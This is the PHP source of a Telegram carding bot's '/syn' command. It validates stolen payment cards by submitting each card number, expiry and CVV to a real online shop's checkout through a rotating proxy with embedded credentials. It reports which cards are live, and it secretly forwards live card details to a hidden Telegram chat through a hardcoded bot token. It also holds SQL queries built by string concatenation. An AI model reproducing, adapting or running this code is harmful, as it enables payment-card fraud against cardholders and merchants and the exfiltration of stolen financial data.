<?php
list($cmd) = explode(" ", $text);
if($cmd == "/syn" or $cmd == ".syn" or $cmd == "!syn" or $cmd == "?syn" or $cmd == "#syn" or $cmd == ":syn" or $cmd == ",syn"){ 

    // if($user_id != 1260898878){
    //     $content = ['chat_id' => $chat_id, 'text' => "𝑮𝒂𝒕𝒆𝒘𝒂𝒚 𝑶𝒇𝒇 ❌", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
    //     SendMessage($content);
    //     exit();
    // }
    if($cmd == '/syn'){
        $gatecmd = "syn";
    }elseif($cmd == ".syn"){
        $gatecmd = "syn";
    }elseif($cmd == "!syn"){
        $gatecmd = "syn";
    }elseif($cmd == "?syn"){
        $gatecmd = "syn";
    }elseif($cmd == "#syn"){
        $gatecmd = "syn";
    }elseif($cmd == ":syn"){
        $gatecmd = "syn";
    }elseif($cmd == ",syn"){
        $gatecmd = "syn";
    }
    $lista = explode(" ", $text)[1];
    $SQL = "SELECT * FROM `authorize` WHERE chats=".$chat_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $chats =anicap($final2, '"chats":"','"');
    if($chats != $chat_id and $ctype == "supergroup"){
        $content = ['chat_id' => $chat_id, 'text' => "𝑻𝒉𝒊𝒔 𝒈𝒓𝒐𝒖𝒑 𝒊𝒔𝒏'𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆, 𝒄𝒐𝒏𝒕𝒂𝒄𝒕 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit();
    }
    else{
        
       
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $json_array = [];


    while ($row = mysqli_fetch_assoc($CONSULTA)) {
    $json_array[] = $row;
    }

    $final2 = json_encode($json_array);

    $plan =anicap($final2, '"plan":"','"');
    mysqli_close(mysqlcon());
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE plan=".$plan;
    if(empty($plan)){
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    if($plan == "Free User" and $ctype == "private"){
        $content = ['chat_id' => $chat_id, 'text' => "𝒀𝒐𝒖 𝒂𝒓𝒆 𝒏𝒐𝒕 𝒂𝒖𝒕𝒉𝒐𝒓𝒊𝒛𝒆𝒅 𝒕𝒐 𝒖𝒔𝒆 𝒎𝒆 𝒊𝒏 𝒑𝒓𝒊𝒗𝒂𝒕𝒆 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆 𝒑𝒓𝒆𝒎𝒊𝒖𝒎 𝒇𝒓𝒐𝒎 @BossNetworkk", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit();
    }else{
        
    }
    $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
    $CONSULTA = mysqli_query(mysqlcon(),$SQL);
    $f = mysqli_num_rows($CONSULTA);

    if($f > 0)
    {} else{
        $content = ['chat_id' => $chat_id, 'text' => "𝑳𝒐𝒐𝒌𝒔 𝑳𝒊𝒌𝒆 𝒀𝒐𝒖 𝒉𝒂𝒗𝒆𝒏'𝒕 𝒓𝒆𝒈𝒊𝒔𝒕𝒆𝒓𝒆𝒅 𝒚𝒐𝒖𝒓 𝒔𝒆𝒍𝒇, 𝒅𝒐 /register 𝒕𝒐 𝒄𝒐𝒏𝒕𝒊𝒏𝒖𝒆", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        exit;
    }
    if (empty($lista)) {
        $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒂 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
    } else {
        $CurlX = new CurlX;
        $check = strlen($lista);
        $chem = substr($lista, 0, 1);
        $vaut = array(1, 2, 7, 8, 9, 0);
        preg_match_all('/\d+/', $text, $matches);
    if (count($matches[0]) == 3) {
        $cc = $matches[0][0];
        $mes = substr($matches[0][1], 0, 2);
        $ano = substr($matches[0][1], -2);
        $cvv = $matches[0][2];
    } else if (strlen($matches[0][1]) == 3) {
        $cc = $matches[0][0];
        $ano1 = $matches[0][2];
        $ano = $matches[0][3];
        $cvv = $matches[0][1];
        $mes = $ano1;
    } else {
        $cc = $matches[0][0];
        $mes = $matches[0][1];
        $ano = $matches[0][2];
        $cvv = $matches[0][3];
    }
    $bin = substr($cc,0,6);
    $first1 = substr($cc,0,1);
    if($first1 == "4"){
        $cc_type = "VI";
    }
    if($first1 == "5"){
        $cc_type = "MC";
    }
    


        if (in_array($chem, $vaut)) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        } elseif ($check < 15) {
            $content = ['chat_id' => $chat_id, 'text' => "𝑬𝒏𝒕𝒆𝒓 𝒗𝒂𝒍𝒊𝒅 𝒄𝒂𝒓𝒅", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            SendMessage($content);
            exit();
        }
        if (strlen($ano) == 2) {
            $ano = "20" . $ano;
        }
        $SQL = "SELECT * FROM `ADMINISTRAR` WHERE id=".$user_id;
        $c = mysqli_query(mysqlcon(),$SQL);
        $time = 30;
        $RAW = mysqli_fetch_assoc($c);
        $ANTISPAM = $RAW['antispam'];
        $Rango = $RAW['rango'];
        $TIMEAC = time() - $ANTISPAM;
        if($TIMEAC < 30)
        {
            $TotalTime = $time - $TIMEAC;
            if($plan !== "Free User"){

            }elseif($TotalTime > 0){
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 𝑫𝒆𝒕𝒆𝒄𝒕𝒆𝒅 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑨𝒏𝒕𝒊𝒔𝒑𝒂𝒎 : <code><i>$TotalTime</i></code>s\n══════════════════════</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
            $m1  = SendMessage($content);
            exit;
            }
        }
        $che = bannedbin($bin);
        if($che == true){
                $content = ['chat_id' => $chat_id, 'text' => "<b>Bin Blocked leccher</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
                $m1  = SendMessage($content);
                exit();
        }
        $timest = time();
        $SQL = "UPDATE ADMINISTRAR SET antispam = '$timest' WHERE id=".$user_id;
        $CONSULTA = mysqli_query(mysqlcon(),$SQL);
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑷𝒍𝒆𝒂𝒔𝒆 𝒘𝒂𝒊𝒕...</b>", 'reply_to_message_id' => $msg_id, 'parse_mode' => 'html'];
        $m1  = SendMessage($content);
        $m1i = $m1['result']['message_id'];
        $server = [
            "METHOD" => "CUSTOM",
            "SERVER" => "p.webshare.io:80",
    
    
            "AUTH"   => "rteavycr-rotate:f9o3l1ryizdq"
        ];
        $cctwo = substr("$cc", 0, 6);
$curl = curl_init();
curl_setopt_array($curl, [
CURLOPT_URL => "https://bins-su-ani.vercel.app/api/".$bin,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_FOLLOWLOCATION => true,
CURLOPT_ENCODING => "",
CURLOPT_MAXREDIRS => 10,
CURLOPT_TIMEOUT => 30,
CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_HTTPHEADER => [
"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"accept-language: en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7",
"sec-fetch-dest: document",
"sec-fetch-site: none",
"user-agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
],
]);

$result = curl_exec($curl);
curl_close($curl);
$data = json_decode($result, true);
$bank = $data['data']['bank'];
$country = $data['data']['country'];
$brand = $data['data']['vendor'];
$level = $data['data']['level'];
$type = $data['data']['type'];
$flag = $data['data']['countryInfo']['emoji'];
$result1 = $data['result'];

$cookie = uniqid();
        /*----------  R1 CAPTCHA  ----------*/

        $headers = array(
            'authority: www.brooklynbrigade.us',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language: en-US,en;q=0.9',
            'sec-fetch-dest: document',
            'sec-fetch-mode: navigate',
            'sec-fetch-site: same-origin',
            'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'');

        $r1 = $CurlX::Get('https://www.brooklynbrigade.us/shop/geo-flower-pocket-square-bbb2spc112', $headers,$cookie,$server);
        
        $form_key = getData($r1->body, '<input name="form_key" type="hidden" value="', '"');

        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■□□□□</b>", 'message_id' => $m1i, 'parse_mode' => 'html'];
        $m2  = EditMessageText($content);
        $m2i = $m2['result']['message_id'];

        /*----------  R2 CAPTCHA  ----------*/


        $headers = array(
            'authority: www.brooklynbrigade.us',
            'accept: application/json, text/javascript, */*; q=0.01',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/x-www-form-urlencoded; charset=UTF-8',
            'origin: https://www.brooklynbrigade.us',
            'referer: https://www.brooklynbrigade.us/shop/geo-flower-pocket-square-bbb2spc112',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'x-requested-with: XMLHttpRequest',
        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'');
        
        $r2 = $CurlX::Post("https://www.brooklynbrigade.us/checkout/cart/add/uenc/aHR0cHM6Ly93d3cuYnJvb2tseW5icmlnYWRlLnVzL3Nob3AvZ2VvLWZsb3dlci1wb2NrZXQtc3F1YXJlLWJiYjJzcGMxMTI%2C/product/2302/", 'product=2302&selected_configurable_option=&related_product=&item=2302&form_key='.$form_key.'&super_attribute%5B92%5D=53&qty=1&action_url=https%3A%2F%2Fwww.brooklynbrigade.us%2Fcheckout%2Fcart%2Fadd%2Fuenc%2FaHR0cHM6Ly93d3cuYnJvb2tseW5icmlnYWRlLnVzL3Nob3AvZ2VvLWZsb3dlci1wb2NrZXQtc3F1YXJlLWJiYjJzcGMxMTI%252C%2Fproduct%2F2302%2F&ajax=1',$headers,$cookie,$server);
        
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■□□</b>", 'message_id' => $m2i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
        $m3i = $m3['result']['message_id'];

        /*----------  R1 STRIPE  ----------*/

        $headers = array(
            'authority: www.brooklynbrigade.us',
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language: en-US,en;q=0.9',
            'referer: https://www.brooklynbrigade.us/shop/geo-flower-pocket-square-bbb2spc112',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'x-requested-with: XMLHttpRequest',
        'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'');
        
        $r3 = $CurlX::Get("https://www.brooklynbrigade.us/checkout/",$headers,$cookie,$server);

        /*----------  R2 STRIPE  ----------*/

        $headers = array(
            'authority: www.brooklynbrigade.us',
            'accept: */*',
            'accept-language: en-US,en;q=0.9',
            'content-type: application/json',
            'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMyNjA0ODEiLCJhcCI6IjU2MTMwMzcwMSIsImlkIjoiNDRlZDNjYWI2NzQ4MjVjMiIsInRyIjoiNjc3YmMxNjA3YjkxOWFjZTUyMTU2N2U4OTQxNGQ2YTUiLCJ0aSI6MTY1MzkzMjg1MDk1OH19',
            'origin: https://www.brooklynbrigade.us',
            'referer: https://www.brooklynbrigade.us/checkout/',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'traceparent: 00-677bc1607b919ace521567e89414d6a5-44ed3cab674825c2-01',
            'tracestate: 3260481@nr=0-1-3260481-561303701-44ed3cab674825c2----1653932850958',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36',
            'x-newrelic-id: VwQBUVJbCRAFUlBRBwIFX1Y=',
            'x-requested-with: XMLHttpRequest',
        );
        
        $r4 = $CurlX::Post("https://www.brooklynbrigade.us/rest/default/V1/guest-carts/eFKXuFQSxdiqfpqX04cZA99BT72X1Sxx/payment-information", '{"cartId":"eFKXuFQSxdiqfpqX04cZA99BT72X1Sxx","billingAddress":{"countryId":"US","regionId":"4","regionCode":"AZ","region":"Arizona","street":["214 East Camelback Road"],"company":"","telephone":"9428388837","postcode":"85012","city":"Phoenix","firstname":"jhon","lastname":"ohio","middlename":"","saveInAddressBook":null},"paymentMethod":{"method":"ebizcharge_ebizcharge","additional_data":{"cc_cid":"'.$cvv.'","cc_type":"'.$cc_type.'","cc_exp_year":"'.$ano.'","cc_exp_month":"'.$mes.'","cc_number":"'.$cc.'","cc_owner":"jjsi jsksj","ebzc_option":"new","ebzc_method_id":false,"ebzc_cust_id":"","ebzc_save_payment":false,"paymentToken":false}},"email":"aircracker2021@hotmail.com"}', ['authority: www.brooklynbrigade.us',
        'accept: */*',
        'accept-language: en-US,en;q=0.9',
        'content-type: application/json',
        'newrelic: eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMyNjA0ODEiLCJhcCI6IjU2MTMwMzcwMSIsImlkIjoiNDRlZDNjYWI2NzQ4MjVjMiIsInRyIjoiNjc3YmMxNjA3YjkxOWFjZTUyMTU2N2U4OTQxNGQ2YTUiLCJ0aSI6MTY1MzkzMjg1MDk1OH19',
        'origin: https://www.brooklynbrigade.us',
        'referer: https://www.brooklynbrigade.us/checkout/',
        'sec-fetch-dest: empty',
        'sec-fetch-mode: cors',
        'sec-fetch-site: same-origin',
        'traceparent: 00-677bc1607b919ace521567e89414d6a5-44ed3cab674825c2-01',
        'tracestate: 3260481@nr=0-1-3260481-561303701-44ed3cab674825c2----1653932850958',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36',
        'x-newrelic-id: VwQBUVJbCRAFUlBRBwIFX1Y=',
        'x-requested-with: XMLHttpRequest',],$cookie,$server)->body;

        $msg = getData($r4,'"message":"','"');
        $content = ['chat_id' => $chat_id, 'text' => "<b>𝑪𝒂𝒓𝒅: <code>$cc|$mes|$ano|$cvv</code> ■■■■■ </b>", 'message_id' => $m3i, 'parse_mode' => 'html'];
        $m4  = EditMessageText($content);
        $m4i = $m4['result']['message_id'];

        if (strpos($r4, 'CVV')) {
            $cc_code = 'CCN LIVE ✅';
            $full = "unkhown\nCC == <code>$cc|$mes|$ano|$cvv</code>\nRES = $cc_code\nREZPONSE- $msg";
            $url = "https://api.telegram.org/bot5579015618:AAEnGaXH73gQ0wn7kjrdsskESUr8FmRgGSw/sendMessage?chat_id=-1001722364754&text=".$full."&parse_mode=HTML";
             
            file_get_contents($url);
        } elseif (strpos($r4, 'AVS')) {
            $cc_code = 'Approved ✅';
        } else {
            $cc_code = 'Declined ❌';
        }
        if (empty($r4)) {
            $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑼𝑵𝑲𝑵𝑶𝑾𝑵 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑼𝑵𝑲𝑵𝑶𝑾𝑵 𝑨𝑼𝑻𝑯</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>Unknown error</code>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n_𝑩𝒚: @$username [$plan]\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
            $m3  = EditMessageText($content);
            exit();
        }

        $content = ['chat_id' => $chat_id, 'text' => "<b>┏━━━━━━━━━━━━━━\n┣ 🍁 𝑼𝑵𝑲𝑵𝑶𝑾𝑵 🍁\n┗━━━━━━━━━━━━━━\n══════════════════════\n[ϟ] 𝑮𝑨𝑻𝑬 : <code>𝑼𝑵𝑲𝑵𝑶𝑾𝑵 𝑨𝑼𝑻𝑯</code>\n[ϟ] 𝑪𝒂𝒓𝒅 : <code>$cc|$mes|$ano|$cvv</code>\n[ϟ] 𝑹𝒆𝒔𝒖𝒍𝒕 : <code>$cc_code</code>\n[ϟ] 𝑹𝒆𝒔𝒑𝒐𝒏𝒔𝒆 : <b>$msg</b>\n┏━━━━━━━━━━━━━━\n┣ 🍁 𝑩𝑰𝑵 𝑫𝑨𝑻𝑨 🍁\n┗━━━━━━━━━━━━━━\n[ϟ] 𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔: $bin - $type - $brand - $level\n[ϟ] 𝑩𝒂𝒏𝒌: $bank\n[ϟ] 𝑪𝒐𝒖𝒏𝒕𝒓𝒚: $country - $flag\n[ϟ] 𝑪𝒉𝒆𝒄𝒌𝒆𝒅 𝑩𝒚: @$username [$plan]\n[ϟ] 𝑩𝒐𝒕 𝑩𝒚 : <code>@BossNetworkk</code>\n══════════════════════</b>", 'message_id' => $m4i, 'parse_mode' => 'html'];
        $m3  = EditMessageText($content);
    }
}
